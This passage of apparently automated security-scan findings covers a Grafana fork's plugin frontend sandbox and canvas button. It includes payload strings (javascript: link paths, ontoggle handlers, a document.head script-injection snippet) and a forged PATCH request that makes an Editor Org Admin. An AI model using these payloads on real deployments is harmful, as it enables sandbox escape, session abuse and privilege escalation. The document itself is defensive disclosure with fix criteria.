5. [public/app/features/explore/extensions/ToolbarExtensionPointMenu.tsx:43–48](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/extensions/ToolbarExtensionPointMenu.tsx#L43-L48)
   Every path-bearing ExploreToolbarAction link from any installed app plugin is routed to onSelect, which ToolbarExtensionPoint.tsx:80-86 turns into the ConfirmNavigationModal. BasicExtensions.tsx:21 shows the menu once links.length > 1 (core 'Add to dashboard' link plus one plugin link, or two plugin links; limitPerPlugin is 3).
6. [public/app/features/explore/TraceView/components/TracePageHeader/TracePageHeader.tsx:238–243](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/TraceView/components/TracePageHeader/TracePageHeader.tsx#L238-L243)
   Second non-React sink: the trace header action button calls window.open(link.path, '_blank') directly for any plugin link at grafana/traceview/header/actions (usePluginLinks at 140-144, limitPerPlugin 2); one click executes a javascript: path.
7. [public/app/features/plugins/importer/pluginImporter.ts:106](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/pluginImporter.ts#L106)
   appPluginPostImport registers plugin.addedLinkConfigs into the host AddedLinksRegistry for sandboxed and non-sandboxed plugins alike; `path` strings cross the near-membrane as primitives.
8. [public/app/features/plugins/sandbox/sandboxComponents.tsx:34–111](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxComponents.tsx#L34-L111)
   The sandbox wrapper only membrane-wraps panel/root/components/addedComponentConfigs/exposedComponentConfigs/configPages; addedLinkConfigs are not touched, so a sandboxed plugin's link path is consumed by host code in the blue realm.

## Impact
Code runs in a same-origin window with opener access to the authenticated Grafana document: it can read window.grafanaBootData, the DOM and non-HttpOnly storage, issue session-authenticated API requests as the victim (read dashboards/datasource settings, change what the victim's role permits) and tamper with the host UI — everything the Frontend Sandbox is documented to prevent. Availability impact limited to the victim's tab.

## Reproduction steps
1. The attacker authors a third-party app plugin that the operator installs and lists in enable_frontend_sandbox_for_plugins (the plugin is otherwise confined by the near-membrane). The plugin registers a link at grafana/explore/toolbar/action or grafana/traceview/header/actions with path 'javascript:<code>//' (or returns it from configure()). A victim with Explore access opens Explore with a query, picks the plugin's entry in the 'Add' menu and clicks 'Open in new tab' in the modal (two clicks), or clicks the plugin's trace-header button (one click); the host calls window.open on the javascript: URL and the code runs in the Grafana origin with a live opener. Requires the victim to be on an Explore/trace view and to click a plugin-titled entry (AT:P, UI:A); the attacker holds only the low-trust position of a sandboxed plugin (PR:L). Works under default config (CSP off).

## Recommended fix
1. Neither registration (AddedLinksRegistry.mapToRegistry) nor the render-time configure() override (getLinkExtensionOverrides / addedLinkToExtensionLink) validates the scheme or origin of an extension link's `path`, so plugin-supplied javascript:/data:/vbscript: URLs reach core navigation code. Fix criteria: An extension link path is accepted only if it is a relative path or an http(s) URL, both at registration and after configure() overrides; other schemes are dropped and logged. Verify that a plugin registering or configure()-returning 'javascript:1' never appears as an href, a window.open argument or a locationService.push argument.
2. Core consumers that leave React's attribute sanitisation — ConfirmNavigationModal.tsx:17, alerting ConfirmationNavigationModal.tsx:17, DrilldownExtensionPoint.tsx:50, TracePageHeader.tsx:241 — pass the plugin path straight to window.open. Fix criteria: Every core consumer that opens or navigates to an extension path does so only after the same scheme/origin validation (or the shared URL sanitiser), independent of React's rendering path. Verify that each of these sinks refuses a javascript: path.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256218

---

# Sandbox innerHTML distortion blocks only four inline handler names; setAttribute undistorted

## Details
When a plugin is listed in security.enable_frontend_sandbox_for_plugins its module is evaluated in a near-membrane child realm (sandboxPluginLoader.ts:90) and every DOM API it touches is a proxy to the host document, intercepted only where distortions.ts registers a distortion. innerHTMLDistortion (distortions.ts:188-222) guards Element.prototype.innerHTML/outerHTML/insertAdjacentHTML and DOMParser.parseFromString: it throws on `<iframe` and, only when the lower-cased string matches /onerror|onload|onsuccess|onbeforeunload/, runs DOMPurify.sanitize. Every other string is handed verbatim to the native setter with `this` bound to the real host element. The browser parses it into the host document and compiles any inline event-handler attribute (ontoggle, onfocus, onanimationstart, onbegin, onclick, onpointerenter, …) in the host (blue) realm, not the plugin's realm. `<details open ontoggle=…>` and `<input autofocus onfocus=…>` fire without any user action.

Independently, Element.prototype.setAttribute/setAttributeNS and Range.prototype.createContextualFragment appear nowhere in the distortion map (distortions.ts:72-89), so `el.setAttribute('ontoggle', code)` on a host element installs a host-realm handler directly, and a fragment built by createContextualFragment carries handler attributes through the append/appendChild distortions, which only filter nodeName 'iframe' (constants.ts:1).

The plugin always has a host element to write to: getSafeSandboxDomElement (documentSandbox.ts:41-48) returns live host nodes for anything inside the plugin's own data-plugin-sandbox container, for detached nodes (document.createElement returns one), for document.body and for body's direct children. The Trusted Types defaultPolicy handed to near-membrane (trustedTypePolicies.ts:6-13) only rewrites `<script`, and CSP is off by default (conf/defaults.ini: content_security_policy = false), so nothing downstream neutralises the handler.

The sandbox already endows the plugin with grafanaBootData and the shared @grafana/runtime module (loader/sharedDependencies.ts:55), so the gain is not boot data or API calls as the viewer; it is exactly what plugin-frontend-sandbox.md says the sandbox prevents: host-realm code can rewrite core UI outside the plugin's container, tamper with other plugins, and replace host globals (e.g. window.fetch/XMLHttpRequest, which red-realm code cannot assign because blue globals are not live targets) to intercept every other panel's and admin page's responses. The distortion's own regex shows the project intends to block inline handlers; the four-name deny-list is simply incomplete, and setAttribute is not covered at all.

Assumption: @locker/near-membrane-dom (version not recoverable; no package.json ships in this snapshot) forwards accessor setters and undistorted methods to the blue native with the blue element as receiver and does not itself sanitise markup — consistent with how the existing distortion is written.

## Evidence
1. [public/app/features/plugins/sandbox/distortions.ts:208–221](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L208-L221)
   innerHTMLDistortion runs DOMPurify.sanitize only when the lower-cased string matches /onerror|onload|onsuccess|onbeforeunload/; any other string is handed verbatim to the native innerHTML/outerHTML/insertAdjacentHTML setter via originalMethod.apply(this, args) with `this` bound to the real host element, so inline handlers such as ontoggle, onfocus, onanimationstart, onbegin or onclick are parsed into the host document and compiled in the host (blue) realm.
2. [public/app/features/plugins/sandbox/distortions.ts:72–89](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L72-L89)
   Complete list of registered distortions. Element.prototype.setAttribute/setAttributeNS and Range.prototype.createContextualFragment are absent, so el.setAttribute('ontoggle', code) on a host element installs a host-realm handler directly, and a fragment built by createContextualFragment carries handler attributes through the append/appendChild distortions, which only filter nodeName 'iframe'.
3. [public/app/features/plugins/sandbox/documentSandbox.ts:41–48](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/documentSandbox.ts#L41-L48)
   getSafeSandboxDomElement hands the plugin live host elements for anything inside its own data-plugin-sandbox container, detached nodes (what document.createElement returns), document.body and body's direct children, so the plugin always has a host node to write markup into or call setAttribute on.
4. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:65–95](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L65-L95)
   distortionCallback is the only interception point: DOM elements go through getSafeSandboxDomElement, functions through generalDistortionMap; createVirtualEnvironment(window, …) runs the plugin in a near-membrane child realm whose DOM is the host document, with defaultTrustedTypesPolicy as the only markup policy.
5. [public/app/core/trustedTypePolicies.ts:6–12](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/core/trustedTypePolicies.ts#L6-L12)
   The Trusted Types default policy passed to near-membrane only rewrites `<script`; it does not strip on* attributes, so it does not neutralise the handler even where Trusted Types is enforced.
6. [public/app/features/plugins/sandbox/constants.ts:1](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/constants.ts#L1)
   forbiddenElements is ['iframe'] only, so a detached container filled via innerHTML (or a createContextualFragment result) passes the appendChild/append distortions into the document.
7. [public/app/features/plugins/importer/importPluginModule.ts:66–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/importPluginModule.ts#L66-L72)
   Production wiring: when shouldLoadPluginInFrontendSandbox is true (plugin id listed in security.enable_frontend_sandbox_for_plugins and not Grafana-signed), the module is loaded through importPluginModuleInSandbox.

## Impact
Host-realm JavaScript in the victim's Grafana origin: the code can replace host fetch/XMLHttpRequest and read every other plugin's and core page's API responses and DOM, rewrite any part of the UI, and drive the host's own services to issue authenticated actions — the isolation the sandbox documents is lost entirely. Availability impact is limited to breaking the page.

## Reproduction steps
1. Attacker: author of a sandboxed plugin's frontend code — a third-party plugin an admin enrolled in enable_frontend_sandbox_for_plugins, or (the documented use case) an Editor supplying custom JavaScript to a JS-capable panel plugin that evaluates it in the red realm. One innerHTML assignment of `<details open ontoggle=…>` into the plugin's own container, or one el.setAttribute('ontoggle', …), runs code in the host realm as soon as a victim renders the page. Requires the non-default sandbox enrolment (AT:P); works under the default CSP-off configuration; the viewer merely loads the page (UI:P).

## Recommended fix
1. The innerHTML/outerHTML/insertAdjacentHTML/parseFromString distortion decides whether to sanitise with a four-name deny-list regex, so most inline event-handler attributes reach the host parser unsanitised. Fix criteria: Markup written by sandboxed code is always sanitised (all on* attributes and javascript:/data: URL attributes stripped) regardless of which handler name appears; verify that <details open ontoggle>, <input autofocus onfocus>, <svg><animate onbegin> and animation/transition handlers written via innerHTML do not execute in the host realm.
2. Element.prototype.setAttribute/setAttributeNS and Range.prototype.createContextualFragment are not distorted, so handler attributes and live fragments bypass the innerHTML path entirely. Fix criteria: Setting any attribute whose name starts with 'on' (case-insensitive) or a URL attribute with a script scheme from sandboxed code is refused, and fragment-creation APIs apply the same sanitisation as innerHTML; verify with el.setAttribute('onclick', …), el.setAttributeNS(null, 'ontoggle', …) and createContextualFragment payloads.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sandbox escape
**CWE:** [CWE-184](https://cwe.mitre.org/data/definitions/184.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256217

---

# Sandbox append/prepend/after/before distortions filter iframes only, letting <script> elements execute in the host realm

## Details
The Plugin Frontend Sandbox (public/app/features/plugins/sandbox) evaluates a non-Grafana-signed plugin's module inside a @locker/near-membrane virtual environment and relies on 'distortions' to keep plugin code from executing in the host realm. The appendChild distortion (distortions.ts:351-382) implements this for <script>: the node is never inserted, its src is fetched and evaluated in the red realm by loadScriptIntoSandbox. The parallel distortion for Element.prototype.append/prepend/after/before and Document.prototype.append/prepend, getAppendDistortion (distortions.ts:326-348), only drops nodes whose nodeName is in forbiddenElements (constants.ts: ['iframe']) and then calls the native method on the real host element with everything else. A <script> node is not filtered.

A sandboxed plugin can therefore run

  const s = document.createElement('script');   // createElement distortion only blocks 'iframe'
  s.textContent = '...';  // or s.src = <any URL>; HTMLScriptElement.src/textContent are not distorted
  document.head.append(s);  // or prepend/after/before on its own container, body or documentElement

The element is inserted into the host document and the browser executes it in the host (blue) realm, outside the membrane, with full access to window, window.grafanaBootData, cookies-bearing fetch, backendSrv and every other plugin — defeating every guarantee plugin-frontend-sandbox.md states (isolating 'plugins from untrusted sources' and user-authored panel JavaScript).

Mechanics confirmed from the checkout: the six methods are value descriptors, so the registration at distortions.ts:384-397 is live (unlike the insertBefore/replaceChild registrations keyed on descriptor.set, filed separately). From the near-membrane sources recovered from public/build/pluginSandbox.76f7fda88ac9b9530e06.js.map (version string not recoverable): createIframeVirtualEnvironment does env.link('document') so the plugin's document is the host document; getTransferablePointer applies distortionCallback to every blue value crossing to red, so document.head.append yields appendDistortion; and pushTarget caches each red proxy against its blue pointer in proxyPointerCache, so the red proxy of the script element is handed back to the blue appendDistortion as the original host node (the same unwrapping the appendChild distortion relies on for arg instanceof HTMLScriptElement). getSafeSandboxDomElement (documentSandbox.ts:21-48) returns document.head, documentElement, body and the plugin's own container as real elements.

CSP does not block it: content_security_policy = false is the shipped default (conf/defaults.ini:542); with the shipped template (defaults.ini:547) 'strict-dynamic' permits non-parser-inserted <script src> created by trusted script, so an s.src payload still executes.

Precondition: the plugin is listed in security.enable_frontend_sandbox_for_plugins (empty by default) and is not Grafana-signed — i.e. exactly the deployment in which the sandbox is the operative control. This is a distinct omission from the undefined-key bug in distortInsert: here the distortion is registered and executed, but its filter is incomplete.

## Evidence
1. [public/app/features/plugins/sandbox/distortions.ts:326–347](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L326-L347)
   getAppendDistortion (used for Element.append/prepend/after/before and Document.append/prepend) filters args only against forbiddenElements (['iframe']) and then calls the original native method on the real host element with the remaining nodes. A <script> element passes the filter and is inserted into the host document, where the browser executes it in the host (blue) realm.
2. [public/app/features/plugins/sandbox/distortions.ts:384–401](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L384-L401)
   The six append-family methods are registered under getAppendDistortion via descriptor.value (method descriptors, so unlike the insertBefore/replaceChild registrations these distortions are actually live); appendChild alone gets getAppendChildDistortion.
3. [public/app/features/plugins/sandbox/distortions.ts:351–381](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L351-L381)
   The sibling appendChild distortion shows the intended handling: a <script> node is never inserted; its src is fetched and evaluated in the red realm via loadScriptIntoSandbox. The append family has no such branch.
4. [public/app/features/plugins/sandbox/constants.ts:1](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/constants.ts#L1)
   forbiddenElements = ['iframe'] is the entire node-name filter the append distortion applies; 'script' is not in it, and createElement('script') is therefore also allowed (distortions.ts:245).
5. [public/app/features/plugins/sandbox/documentSandbox.ts:21–47](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/documentSandbox.ts#L21-L47)
   getSafeSandboxDomElement hands the plugin the real document.head, document.documentElement, document.body, any element inside its own [data-plugin-sandbox] container and any element outside #reactRoot — all valid insertion targets for the script element.
6. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:65–93](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L65-L93)
   The sandbox is createVirtualEnvironment(window, { distortionCallback }): near-membrane links the red 'document' to the host document and routes every blue value crossing to red through distortionCallback, so document.head.append resolves to appendDistortion and the script element created by the (blue) createElement is a real host node.
7. [public/app/features/plugins/importer/importPluginModule.ts:66–72](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/importer/importPluginModule.ts#L66-L72)
   Production entry: when shouldLoadPluginInFrontendSandbox is true (non-Grafana-signed plugin listed in security.enable_frontend_sandbox_for_plugins, sandboxPluginLoaderRegistry.ts:58-79) the plugin module is evaluated through importPluginModuleInSandbox.

## Impact
Arbitrary host-realm JavaScript in the victim's Grafana origin: full read of grafanaBootData, DOM and other plugins' state, authenticated API calls as the viewing user (administrative actions when an admin views), tampering with core UI and other plugins; availability impact limited to breaking the page for that user.

## Reproduction steps
1. Attacker is the author of a third-party plugin an operator installed and, following the docs' recommendation for untrusted plugins, listed in enable_frontend_sandbox_for_plugins (or an Editor authoring JavaScript in such a sandboxed JS-panel plugin, PR:L for that variant). The plugin's module is fetched over the network and evaluated in the sandbox when any user renders a page using it; one call to document.head.append(scriptEl) executes attacker code in the host realm. No defence stands in the way; the only condition outside the attacker's control is the non-default sandbox allow-list deployment.

## Recommended fix
getAppendDistortion (Element/Document append, prepend, after, before) filters only forbiddenElements and inserts any other node, including <script>, into the host document, so plugin-authored script executes in the host realm — violating the isolation the sandbox exists to provide. The sibling appendChild distortion already diverts <script> through loadScriptIntoSandbox. Fix criteria: Every DOM insertion API reachable from the sandbox (append, prepend, after, before, replaceWith, replaceChildren on Element, Document and DocumentFragment, plus appendChild/insertBefore/replaceChild/insertAdjacentElement) applies one shared node policy: forbidden elements are dropped and <script> elements are never inserted into the host document, being either refused or evaluated in the red realm. Verify that a sandboxed plugin calling document.head.append(scriptEl) with src or textContent, and the fragment variant, executes nothing in the host realm.

---
**Severity:** HIGH
**Status:** Open
**Category:** Sandbox escape
**CWE:** [CWE-653](https://cwe.mitre.org/data/definitions/653.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256215

---

# Sandbox insertBefore/replaceChild/insertAdjacentElement distortions registered under undefined key, allowing host-realm script injection

## Details
The frontend plugin sandbox (near-membrane) relies on the distortion map in distortions.ts to stop sandboxed plugin code from attaching forbidden elements and from executing scripts in the host (blue) realm. distortInsert() is meant to intercept Node.prototype.insertBefore, Node.prototype.replaceChild and Element.prototype.insertAdjacentElement, but it registers each replacement under `descriptor.set` (distortions.ts:313, :319), which is undefined for method descriptors. The map therefore gains one useless entry keyed `undefined` and no entry for the native methods, so distortionCallback() (sandboxPluginLoader.ts:76-86) hands the real host functions to the plugin.

A sandboxed plugin can run:

  const s = document.createElement('script');          // 'script' is not in forbiddenElements (constants.ts)
  s.textContent = '/* host code */';                   // or s.src = any URL
  document.head.insertBefore(s, null);                 // undistorted native insertBefore

document.head and the detached <script> are returned as real host nodes by getSafeSandboxDomElement(); near-membrane resolves the red proxies of `this` and the argument back to the blue originals when the blue function is applied (the same behaviour the appendChild distortion at distortions.ts:368 depends on), so the script is inserted into the live host document and executes outside the membrane with full access to window.grafanaBootData, document.cookie, backendSrv/contextSrv, other plugins and the whole Grafana UI in the victim's session. replaceChild and insertAdjacentElement give the same result, and the same path attaches <iframe> elements (createElement('IFRAME') passes the case-sensitive check; getSafeSandboxDomElement's nodeName check never matches HTML elements).

CSP is off by default (conf/defaults.ini content_security_policy = false), so inline code or any script URL executes; with the shipped CSP template, 'strict-dynamic' still trusts non-parser-inserted <script src> elements created by already-running script.

The sandbox is documented (docs/sources/administration/plugin-management/plugin-frontend-sandbox.md) as a security feature for 'plugins from untrusted sources' and for panels 'that allow users to write custom JavaScript code', enabled by listing the plugin in security.enable_frontend_sandbox_for_plugins (sandboxPluginLoaderRegistry.ts:78). The attacker is therefore the author of a sandboxed third-party plugin's module.js, or an Editor who authors JavaScript inside a sandboxed JS-capable panel; every Viewer or Admin who opens a page that renders the plugin executes the escape.

Dependency assumption: @locker/near-membrane-dom/-base as bundled in public/build/pluginSandbox.76f7fda88ac9b9530e06.js (version not pinned in this checkout; sources recovered from the map) consults distortionCallback for every blue function crossing into the sandbox and resolves proxied this/arguments to their blue originals on apply — the behaviour the rest of distortions.ts relies on.

## Evidence
1. [public/app/features/plugins/sandbox/distortions.ts:311–320](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L311-L320)
   Node.prototype.insertBefore, Node.prototype.replaceChild and Element.prototype.insertAdjacentElement are data (method) descriptors: descriptor.value is the native function and descriptor.set is undefined. The code tests descriptor.value but registers the replacement with distortions.set(descriptor.set, ...), i.e. Map.set(undefined, fn). The native methods are never keys of the distortion map, so the insertChildDistortion / insertAdjacentElementDistortion wrappers are never applied. This is the line the fix must change.
2. [public/app/features/plugins/sandbox/sandboxPluginLoader.ts:65–87](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoader.ts#L65-L87)
   distortionCallback is near-membrane's hook for every blue value crossing into the plugin realm (near-membrane-base, recovered from public/build/pluginSandbox.*.js.map: distortionTarget = distortionCallback(originalTarget)). For a non-element value it does generalDistortionMap.get(originalValue); for the native insertBefore there is no entry and distortLiveApis returns undefined, so the real host function is returned to the sandboxed code.
3. [public/app/features/plugins/sandbox/documentSandbox.ts:13–54](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/documentSandbox.ts#L13-L54)
   getSafeSandboxDomElement hands document.body, document.head, document.documentElement and any detached node (a freshly created <script>) to the plugin as the real host nodes, so the plugin has a live host parent to call the undistorted insertBefore on. Its forbidden-element check compares the upper-case nodeName of HTML elements with the lower-case list and so never fires for an HTML iframe.
4. [public/app/features/plugins/sandbox/constants.ts:1](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/constants.ts#L1)
   forbiddenElements is ['iframe'] only. 'script' is not forbidden, so document.createElement('script') is permitted; the sandbox's defence against host-realm script execution is the appendChild distortion, which the insert methods bypass.
5. [public/app/features/plugins/sandbox/distortions.ts:241–263](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L241-L263)
   The createElement distortion returns a real (blue) HTMLScriptElement for 'script'. Its iframe check is case-sensitive (forbiddenElements.includes(arg)) and createElementNS is not distorted, so createElement('IFRAME') also yields a real iframe that the undistorted insertBefore can attach.
6. [public/app/features/plugins/sandbox/distortions.ts:351–382](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/distortions.ts#L351-L382)
   The intended control: appendChild of a <script> is intercepted and routed through loadScriptIntoSandbox so the code runs inside the sandbox realm (and iframes are refused). insertBefore/replaceChild/insertAdjacentElement were meant to carry equivalent filtering but, because of the key bug, carry none.
7. [public/app/features/plugins/sandbox/sandboxPluginLoaderRegistry.ts:77–79](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/sandbox/sandboxPluginLoaderRegistry.ts#L77-L79)
   The sandbox is applied to a plugin when the operator lists its id in security.enable_frontend_sandbox_for_plugins (and it is not Grafana-signed). The escape therefore defeats a control the operator has explicitly switched on for a plugin they do not trust.

## Impact
Host-realm JavaScript execution in the victim's Grafana origin: read grafanaBootData and user identity, non-HttpOnly cookies, call any API with the victim's session (including administrative actions when an Admin views the page), rewrite any part of the UI and tamper with other plugins — everything the sandbox exists to deny. Availability impact is limited to breaking the page for that user.

## Reproduction steps
1. The attacker authors the plugin module (third-party plugin author, no Grafana privileges) or JavaScript inside a sandboxed JS-capable panel (Editor). The exploit is a few DOM calls with no defence to defeat; the host's appendChild filtering is simply not applied to insertBefore/replaceChild/insertAdjacentElement. The only prerequisite is the deployment condition that the plugin is installed and sandboxed by the operator (enable_frontend_sandbox_for_plugins) — which is the very control being bypassed. The victim need only open a page that renders the plugin.

## Recommended fix
1. distortInsert registers the insertBefore/replaceChild/insertAdjacentElement replacements under descriptor.set (undefined for method descriptors) instead of descriptor.value, so these native DOM insertion methods reach sandboxed code without the forbidden-element and script filtering that appendChild receives. Fix criteria: Every DOM insertion primitive reachable from the sandbox (insertBefore, replaceChild, insertAdjacentElement, replaceWith, Range.insertNode, etc.) is keyed in the distortion map by the actual native function and applies the same filtering as appendChild: forbidden elements are refused and <script> elements are routed through loadScriptIntoSandbox or rejected. A test asserts the map has entries for these native functions and that a sandboxed plugin inserting a <script> via insertBefore/replaceChild/insertAdjacentElement does not execute code in the host realm.
2. Tag-name checks are inconsistent: createElement's forbidden-tag check is case-sensitive and createElementNS is not distorted, while getSafeSandboxDomElement compares the upper-case nodeName against a lower-case list, so iframes are never recognised there. Fix criteria: Tag-name comparisons are case-insensitive and cover createElementNS; a sandboxed plugin cannot obtain, attach or be handed an iframe/object/embed element by any spelling of the tag name.

---
**Severity:** HIGH
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-424](https://cwe.mitre.org/data/definitions/424.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256214

---

# Canvas button sends stored, unvalidated HTTP method (DELETE/PATCH) as authenticated same-origin request, sidestepping the POST/PUT actions allow-list

## Details
The canvas panel's Button element (default-enabled: panelcfg.gen.ts showAdvancedTypes defaults to true) lets a dashboard author configure an HTTP 'API call' (endpoint, method, headers, query params, body) that is executed in the browser of whoever clicks the button. getRequest() in editor/element/utils.ts builds the request from the stored APIEditorConfig and callApi() sends it through getBackendSrv().fetch() with credentials 'same-origin'. Three facts combine into a forced-authenticated-request primitive from an Editor against any Viewer or Admin who opens the dashboard:

1. The HTTP method is never validated. The editor UI offers only GET/POST/PUT (HttpRequestMethod, panelcfg.gen.ts:66-70), but APIEditorConfig.method is typed string, prepareData() in button.tsx only fills in a default when it is missing, and getRequest() copies it verbatim into the fetch. An Editor who edits the dashboard JSON model (Dashboard settings > JSON Model, or Panel inspect > JSON; both standard Editor features) can store "method": "PATCH" or "DELETE". For PATCH, fetch.ts's patchHeaderParser sets content-type: application/json automatically; api.data (template-interpolated) becomes the body.

2. The only server-side mitigation for action-originated requests is the actions_allow_post_url allow-list, which conf/defaults.ini:569 describes as applying to 'POST/PUT URL in actions' when the X-Grafana-Action: 1 header is present ('Empty will allow anything that is not on the same origin'), and the docs describe as governing 'the POST verb'. With the default empty value same-origin POST/PUT are refused, but DELETE and PATCH fall outside the documented rule. Assumption (the Go server is not in this checkout): the X-Grafana-Action middleware behaves as the config comment and docs describe and does not touch other verbs. Grafana's CSRF middleware is satisfied because the request originates from the Grafana origin.

3. Unlike the shared field/element-actions runtime, the Button path performs no canExecuteActions() check (setDashboardPanelContext.ts:205-208), shows no confirmation modal, and does not restrict the endpoint. The canvas docs (docs/sources/visualizations/panels-visualizations/visualizations/canvas/index.md:133,145) call these 'basic, unauthenticated API calls', but same-origin targets carry the victim's session cookie. The docs' caveat that the call only fires when inline editing is disabled is attacker-controlled: scene.tsx:119 enables inline editing from options.inlineEditing && dashboard.editable, both values in the Editor's own dashboard JSON.

Attack: an Editor adds a canvas Button labelled e.g. 'Refresh' with endpoint /api/org/users/<editorUserId>, method PATCH, payload {"role":"Admin"}, success message 'Refreshed'. When an Org Admin clicks it, the browser sends PATCH /api/org/users/<id> (api-merged.json: updateOrgUserForCurrentOrg, body UpdateOrgUserCommand{role}) with the Admin's cookie and the Editor becomes Org Admin. Other same-origin DELETE/PATCH targets in api-merged.json include DELETE /api/admin/users/{id}, DELETE /api/datasources/uid/{uid}, DELETE /api/folders/{uid}, DELETE /api/dashboards/uid/{uid}, PATCH /api/serviceaccounts/{id}. Template variables (including ${__user.email}/${__user.login}) are interpolated into URL, headers and body. The response body is discarded, so this is a write/forced-action primitive, not a read primitive. The sibling buildActionRequest in features/actions/utils.ts has the same unvalidated config.method but sits behind canExecuteActions and a confirmation dialog (recorded as a lead).

## Evidence
1. [public/app/plugins/panel/canvas/editor/element/utils.ts:42–76](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/canvas/editor/element/utils.ts#L42-L76)
